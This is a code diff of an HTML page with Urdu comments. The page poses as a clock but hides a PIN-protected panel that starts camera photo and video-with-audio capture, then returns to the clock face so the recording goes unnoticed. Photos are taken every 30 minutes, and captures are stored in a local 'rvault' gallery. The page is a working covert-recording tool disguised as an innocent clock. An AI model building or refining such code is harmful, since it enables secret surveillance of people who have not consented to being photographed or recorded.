@@ -57,14 +57,14 @@
 
         <button class="btn btn-blue" onclick="toggleSub('front-menu')">Front Cam Options</button>
         <div id="front-menu" class="sub-menu">
-            <button class="btn btn-green" onclick="quickAction('user', 'photo')">Auto Photo (20 Snaps)</button>
-            <button class="btn btn-orange" onclick="quickAction('user', 'video')">Record 5 Min Video</button>
+            <button class="btn btn-green" onclick="startAutoPhoto('user')">Auto Photo (20 Snaps)</button>
+            <button class="btn btn-orange" onclick="startVideoRecording('user')">Record 5 Min Video</button>
         </div>
 
         <button class="btn btn-blue" onclick="toggleSub('back-menu')">Back Cam Options</button>
         <div id="back-menu" class="sub-menu">
-            <button class="btn btn-green" onclick="quickAction('environment', 'photo')">Auto Photo (20 Snaps)</button>
-            <button class="btn btn-orange" onclick="quickAction('environment', 'video')">Record 5 Min Video</button>
+            <button class="btn btn-green" onclick="startAutoPhoto('environment')">Auto Photo (20 Snaps)</button>
+            <button class="btn btn-orange" onclick="startVideoRecording('environment')">Record 5 Min Video</button>
         </div>
         
         <button class="btn btn-red" onclick="location.reload()">Lock System</button>
@@ -72,6 +72,7 @@
     </div>
 
     <script>
+        // گھڑی کا فنکشن
         function runClock() {
             const now = new Date();
             document.getElementById('sec').style.transform = `translateX(-50%) rotate(${now.getSeconds()*6}deg)`;
@@ -80,7 +81,11 @@
         }
         setInterval(runClock, 1000);
 
-        function openPin() { document.getElementById('pin-screen').style.display='block'; }
+        // اسکرین تبدیلی کے فنکشنز
+        function openPin() { 
+            document.getElementById('pin-screen').style.display='block'; 
+        }
+        
         function goBackToClock() {
             document.getElementById('pin-screen').style.display='none';
             document.getElementById('admin-panel').style.display='none';
@@ -101,76 +106,217 @@
             el.style.display = (el.style.display === 'block') ? 'none' : 'block';
         }
 
-        let stream, rec, chunks = [], photoInterval, photoCount = 0, vTimer;
+        // گلوبل متغیرات
+        let currentStream = null;
+        let currentRecorder = null;
+        let photoInterval = null;
+        let videoTimeout = null;
+        let photoCounter = 0;
+        let chunks = [];
 
-        async function quickAction(camType, mode) {
-            if(stream) stream.getTracks().forEach(t => t.stop());
+        // آٹو فوٹو فنکشن
+        async function startAutoPhoto(camType) {
+            // پہلے سے چل رہی کوئی بھی سرگرمی بند کریں
+            stopAllActivities();
+            
+            // گھڑی کی اسکرین پر واپس جائیں
+            goBackToClock();
+            
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camType }, audio: true });
-                document.getElementById('preview').srcObject = stream;
-                setTimeout(() => {
-                    if(mode === 'photo') startAutoPhoto();
-                    else startVideoRecording();
-                    goBackToClock();
-                }, 500);
-            } catch(e) { alert("Error: " + e.message); }
+                // کیمرہ شروع کریں
+                currentStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: camType },
+                    audio: false 
+                });
+                
+                // پریویو شروع کریں (لیکن نظر نہیں آئے گا)
+                const preview = document.getElementById('preview');
+                preview.srcObject = currentStream;
+                
+                // فوٹو کاؤنٹر ری سیٹ کریں
+                photoCounter = 0;
+                
+                // پہلی فوٹو فوری لیں
+                takePhoto();
+                photoCounter++;
+                
+                // ہر 30 منٹ بعد فوٹو لیں
+                photoInterval = setInterval(() => {
+                    if(photoCounter < 20) {
+                        takePhoto();
+                        photoCounter++;
+                    } else {
+                        // 20 فوٹوز مکمل ہونے پر بند کریں
+                        stopAllActivities();
+                    }
+                }, 30 * 60 * 1000); // 30 منٹ = 30 * 60 * 1000 ملی سیکنڈ
+                
+            } catch(e) {
+                console.error("کیمرہ کی غلطی:", e.message);
+            }
         }
 
-        function startAutoPhoto() {
-            photoCount = 0;
-            if(photoInterval) clearInterval(photoInterval);
-            takeSnap(); photoCount++;
-            photoInterval = setInterval(() => {
-                if(photoCount < 20) { takeSnap(); photoCount++; }
-                else clearInterval(photoInterval);
-            }, 30000);
+        // ویڈیو ریکارڈنگ فنکشن
+        async function startVideoRecording(camType) {
+            // پہلے سے چل رہی کوئی بھی سرگرمی بند کریں
+            stopAllActivities();
+            
+            // گھڑی کی اسکرین پر واپس جائیں
+            goBackToClock();
+            
+            try {
+                // کیمرہ اور مائیکروفون شروع کریں
+                currentStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: camType },
+                    audio: true 
+                });
+                
+                // پریویو شروع کریں
+                const preview = document.getElementById('preview');
+                preview.srcObject = currentStream;
+                
+                // میڈیا ریکارڈر بنائیں
+                currentRecorder = new MediaRecorder(currentStream);
+                chunks = [];
+                
+                currentRecorder.ondataavailable = (e) => {
+                    if(e.data.size > 0) chunks.push(e.data);
+                };
+                
+                currentRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = () => {
+                        saveData('vid', reader.result);
+                    };
+                };
+                
+                // ریکارڈنگ شروع کریں
+                currentRecorder.start();
+                
+                // 5 منٹ بعد خودبخود بند کریں
+                videoTimeout = setTimeout(() => {
+                    if(currentRecorder && currentRecorder.state === "recording") {
+                        currentRecorder.stop();
+                        stopAllActivities();
+                    }
+                }, 5 * 60 * 1000); // 5 منٹ = 5 * 60 * 1000 ملی سیکنڈ
+                
+            } catch(e) {
+                console.error("ریکارڈنگ کی غلطی:", e.message);
+            }
         }
 
-        function takeSnap() {
-            const v = document.getElementById('preview');
-            const c = document.getElementById('canvas');
-            if(!v.videoWidth) return;
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            saveData('img', c.toDataURL('image/jpeg', 0.5));
+        // فوٹو لینے کا فنکشن
+        function takePhoto() {
+            if(!currentStream) return;
+            
+            const preview = document.getElementById('preview');
+            const canvas = document.getElementById('canvas');
+            
+            if(!preview.videoWidth) return;
+            
+            canvas.width = preview.videoWidth;
+            canvas.height = preview.videoHeight;
+            
+            const context = canvas.getContext('2d');
+            context.drawImage(preview, 0, 0, canvas.width, canvas.height);
+            
+            // تصویر محفوظ کریں
+            saveData('img', canvas.toDataURL('image/jpeg', 0.7));
         }
 
-        function startVideoRecording() {
+        // تمام سرگرمیاں بند کرنے کا فنکشن
+        function stopAllActivities() {
+            // فوٹو انٹرویل بند کریں
+            if(photoInterval) {
+                clearInterval(photoInterval);
+                photoInterval = null;
+            }
+            
+            // ویڈیو ٹائمر بند کریں
+            if(videoTimeout) {
+                clearTimeout(videoTimeout);
+                videoTimeout = null;
+            }
+            
+            // ریکارڈر بند کریں
+            if(currentRecorder && currentRecorder.state === "recording") {
+                currentRecorder.stop();
+                currentRecorder = null;
+            }
+            
+            // کیمرہ سٹریم بند کریں
+            if(currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+                currentStream = null;
+            }
+            
+            // پریویو کلئیر کریں
+            const preview = document.getElementById('preview');
+            preview.srcObject = null;
+            
             chunks = [];
-            rec = new MediaRecorder(stream);
-            rec.ondataavailable = e => chunks.push(e.data);
-            rec.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = () => saveData('vid', reader.result);
-            };
-            rec.start();
-            // 5 منٹ بعد آٹو سٹاپ
-            if(vTimer) clearTimeout(vTimer);
-            vTimer = setTimeout(() => { if(rec.state === "recording") rec.stop(); }, 300000);
+            photoCounter = 0;
         }
 
+        // ڈیٹا محفوظ کرنے کا فنکشن
         function saveData(type, data) {
-            let s = JSON.parse(localStorage.getItem('rvault') || '[]');
-            s.push({ t: type, d: data, time: new Date().toLocaleString() });
-            localStorage.setItem('rvault', JSON.stringify(s));
+            let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
+            storage.push({ 
+                t: type, 
+                d: data, 
+                time: new Date().toLocaleString('ur-PK') 
+            });
+            localStorage.setItem('rvault', JSON.stringify(storage));
+            
+            // اگر ایڈمن پینل کھلا ہے تو گیلری اپڈیٹ کریں
+            if(document.getElementById('admin-panel').style.display === 'block') {
+                updateGallery();
+            }
         }
 
+        // گیلری اپڈیٹ کرنے کا فنکشن
         function updateGallery() {
-            const s = JSON.parse(localStorage.getItem('rvault') || '[]');
-            const g = document.getElementById('gallery');
-            g.innerHTML = '';
-            s.slice().reverse().forEach((i, idx) => {
-                let actualIdx = s.length - 1 - idx;
-                let media = i.t === 'img' ? `<img src="${i.d}">` : `<video src="${i.d}" controls></video>`;
-                g.innerHTML += `<div class="card">${media}<p style="font-size:10px">${i.time}</p><button class="del-btn" onclick="del(${actualIdx})">Delete</button></div>`;
+            const storage = JSON.parse(localStorage.getItem('rvault') || '[]');
+            const gallery = document.getElementById('gallery');
+            gallery.innerHTML = '';
+            
+            storage.slice().reverse().forEach((item, index) => {
+                const actualIndex = storage.length - 1 - index;
+                const media = item.t === 'img' 
+                    ? `<img src="${item.d}" style="max-height: 150px; object-fit: cover;">` 
+                    : `<video src="${item.d}" controls style="max-height: 150px; object-fit: cover;"></video>`;
+                
+                gallery.innerHTML += `
+                    <div class="card">
+                        ${media}
+                        <p style="font-size:10px; margin:5px 0">${item.time}</p>
+                        <button class="del-btn" onclick="deleteItem(${actualIndex})">Delete</button>
+                    </div>
+                `;
             });
         }
 
-        function del(idx) {
-            let s = JSON.parse(localStorage.getItem('rvault') || '[]');
-            if(confirm("Delete this?")) { s.splice(idx, 1); localStorage.setItem('rvault', JSON.stringify(s)); updateGallery(); }
+        // آئٹم ڈیلیٹ کرنے کا فنکشن
+        function deleteItem(index) {
+            if(confirm("کیا آپ واقعی اس آئٹم کو ڈیلیٹ کرنا چاہتے ہیں؟")) {
+                let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
+                storage.splice(index, 1);
+                localStorage.setItem('rvault', JSON.stringify(storage));
+                updateGallery();
+            }
+        }
+
+        // صفحہ بند ہوتے وقت تمام سرگرمیاں بند کریں
+        window.addEventListener('beforeunload', () => {
+            stopAllActivities();
+        });
+
+        // پہلے سے محفوظ ڈیٹا کی جانچ
+        if(localStorage.getItem('rvault')) {
+            console.log("موجودہ ذخیرہ شدہ آئٹمز:", JSON.parse(localStorage.getItem('rvault')).length);
         }
     </script>
 </body>
